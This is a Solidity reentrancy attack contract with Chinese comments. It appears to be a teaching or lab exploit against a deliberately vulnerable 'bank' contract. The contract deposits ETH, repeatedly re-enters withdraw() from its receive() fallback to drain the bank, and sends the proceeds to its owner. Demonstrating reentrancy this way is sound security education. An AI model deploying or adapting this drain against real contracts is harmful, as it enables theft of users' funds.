// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract ReentrancyAttacker {
    IVulnerableBank public bank;
    address public owner;

    uint256 public withdrawAmount; // 单次提现额度（等于本次攻击 msg.value）
    uint256 public maxRounds;      // 最大重入次数
    uint256 public rounds;         // 已重入次数

    event AttackStarted(uint256 withdrawAmount, uint256 maxRounds);
    event Reentered(uint256 round, uint256 bankEthLeft);

    constructor(address bankAddress) {
        bank = IVulnerableBank(bankAddress);
        owner = msg.sender;
    }

    // 攻击入口：发送 ETH 作为存款 + 单次提现额度
    function attack(uint256 _maxRounds) external payable {
        require(msg.value > 0, "Must send ETH");
        require(_maxRounds > 0, "maxRounds must be > 0");

        withdrawAmount = msg.value;
        maxRounds = _maxRounds;
        rounds = 0;

        emit AttackStarted(withdrawAmount, maxRounds);

        // 1) 存入银行，让银行 balances[msg.sender] 记账
        bank.deposit{value: msg.value}();

        // 2) 立刻提现，触发银行转账 -> 触发 receive() -> 重入
        bank.withdraw(withdrawAmount);
    }

    // 银行给本合约转账时触发
    receive() external payable {
        if (rounds >= maxRounds) return;

        // 银行余额不足就停止，否则下一次转账会失败导致 Transfer failed
        if (address(bank).balance < withdrawAmount) return;

        rounds++;
        emit Reentered(rounds, address(bank).balance);

        bank.withdraw(withdrawAmount);
    }

    // 把攻击合约里的 ETH 提回 owner
    function withdrawAll() external {
        require(msg.sender == owner, "only owner");
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "withdrawAll failed");
    }
}
